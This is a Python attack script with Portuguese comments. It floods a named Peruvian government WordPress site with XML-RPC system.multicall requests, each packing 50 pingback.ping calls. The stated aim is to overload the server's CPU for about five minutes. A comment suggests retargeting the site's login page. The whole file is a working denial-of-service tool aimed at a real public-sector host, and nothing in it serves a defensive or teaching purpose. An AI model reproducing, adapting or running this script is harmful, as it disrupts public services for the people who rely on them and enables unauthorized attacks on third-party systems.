import requests
import time
import random
import string

# --- CONFIGURAÇÃO DO ALVO ---
TARGET_URL = "https://ugelch.gob.pe/xmlrpc.php" 
# Se quiser atacar login, mude a linha acima para: https://ugelch.gob.pe/wp-login.php

def get_random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def generate_xml_payload():
    # Cria uma carga XML-RPC massiva para explodir a CPU do alvo
    calls = []
    for _ in range(50):  # 50 chamadas internas por request externo
        pid = random.randint(1, 9999)
        call = f"""<value><struct>
            <member><name>methodName</name><value><string>pingback.ping</string></value></member>
            <member><name>params</name><value><array><data>
                <value><string>http://{get_random_string(8)}.com/?p={pid}</string></value>
                <value><string>http://{get_random_string(8)}.com</string></value>
            </data></array></value></member>
        </struct></value>"""
        calls.append(call)
    
    xml_body = f"""<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param>
<value><array><data>
{''.join(calls)}
</data></array></value>
</param>
</params>
</methodCall>"""
    return xml_body

def start_attack(duration=290):
    print(f"[+] Iniciando ataque em {TARGET_URL}...")
    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'text/xml'}
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            resp = requests.post(TARGET_URL, data=generate_xml_payload(), headers=headers, timeout=10)
            if resp.status_code == 200:
                pass # Sucesso silencioso
        except Exception:
            pass
        time.sleep(0.5) # Evita que o runner seja bloqueado por uso excessivo de CPU local

if __name__ == "__main__":
    start_attack()